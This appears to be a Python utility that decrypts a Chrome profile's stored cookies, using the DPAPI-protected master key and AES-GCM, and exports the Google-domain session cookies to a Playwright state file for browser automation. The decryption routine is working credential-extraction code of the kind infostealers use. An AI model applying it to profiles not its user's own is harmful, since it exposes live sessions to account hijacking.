import os
import sys
import json
import sqlite3
import shutil
import base64
import win32crypt
from Crypto.Cipher import AES

def log(msg):
    print(f"[EXTRACTOR] {msg}")
    sys.stdout.flush()

def find_chrome():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe")
    ]
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def get_encryption_key(profile_dir):
    local_state_path = os.path.join(profile_dir, "Local State")
    if not os.path.exists(local_state_path):
        # Check parent folder
        local_state_path = os.path.join(os.path.dirname(profile_dir), "Local State")
    
    if not os.path.exists(local_state_path):
        log(f"ERROR: Local State file not found at {local_state_path}")
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove DPAPI prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    
    # Decrypt key using DPAPI
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_cookie_value(encrypted_value, key):
    try:
        # Get IV (bytes 3 to 15)
        iv = encrypted_value[3:15]
        # Get ciphertext (bytes 15 onwards)
        ciphertext = encrypted_value[15:-16]
        # Get tag (last 16 bytes)
        tag = encrypted_value[-16:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        # Chrome 120+ prepends a 32-byte signature/header to GCM decrypted values
        if len(decrypted) >= 32:
            decrypted = decrypted[32:]
        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        # Fallback for older versions or non-GCM
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return None

def extract_and_convert(profile_dir=None, state_path=None):
    if profile_dir is None:
        profile_dir = r"d:\gcr ai\backend\uploads\chrome_profile"
    if state_path is None:
        state_path = r"d:\gcr ai\backend\uploads\state.json"
    cookies_db = os.path.join(profile_dir, "Default", "Network", "Cookies")
    
    if not os.path.exists(cookies_db):
        # Try alternate path
        cookies_db = os.path.join(profile_dir, "Default", "Cookies")
        
    if not os.path.exists(cookies_db):
        log(f"ERROR: Cookies database not found at {cookies_db}")
        return False

    # Get master key
    key = get_encryption_key(profile_dir)
    if not key:
        log("ERROR: Could not retrieve decryption key.")
        return False

    # Copy database file to avoid locking issues
    temp_db = os.path.join(os.path.dirname(profile_dir), "temp_cookies.db")
    shutil.copyfile(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        # Fetch cookies
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, samesite FROM cookies")
        rows = cursor.fetchall()
    except Exception as e:
        log(f"ERROR reading SQLite database: {e}")
        conn.close()
        os.remove(temp_db)
        return False

    playwright_cookies = []
    for host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly, samesite in rows:
        # Only extract Google-related cookies to prevent Playwright protocol errors with malformed third-party cookies
        if not host_key or "google" not in host_key.lower():
            continue

        # Skip cookies with no name
        if not name:
            continue

        decrypted_val = decrypt_cookie_value(encrypted_value, key)
        if not decrypted_val:
            continue

        # SameSite mapping
        # Chrome stores: -1=unset/None, 0=No_restriction(None), 1=Lax, 2=Strict
        samesite_val = "Lax"
        if samesite == -1 or samesite == 0:
            samesite_val = "None"
        elif samesite == 1:
            samesite_val = "Lax"
        elif samesite == 2:
            samesite_val = "Strict"

        # CRITICAL: SameSite=None cookies MUST have Secure=True per browser spec
        # Playwright enforces this and will reject the entire cookie batch otherwise
        cookie_is_secure = bool(is_secure)
        if samesite_val == "None":
            cookie_is_secure = True

        # Expiry mapping (Chrome UTC timestamp is in microseconds since 1601-01-01)
        expires = 0
        if expires_utc > 0:
            # Microseconds since 1601 to seconds since 1970
            expires = int((expires_utc / 1000000) - 11644473600)

        pw_cookie = {
            "name": name,
            "value": decrypted_val,
            "domain": host_key,
            "path": path or "/",
            "httpOnly": bool(is_httponly),
            "secure": cookie_is_secure,
            "sameSite": samesite_val
        }
        if expires > 0:
            pw_cookie["expires"] = expires

        playwright_cookies.append(pw_cookie)

    conn.close()
    try:
        os.remove(temp_db)
    except Exception:
        pass

    # Save to state.json
    state_data = {
        "cookies": playwright_cookies,
        "origins": []
    }

    with open(state_path, "w", encoding="utf-8") as f:
        json.dump(state_data, f, indent=2)

    log(f"SUCCESS: Decrypted and saved {len(playwright_cookies)} cookies to {state_path}!")
    return True

if __name__ == "__main__":
    extract_and_convert()
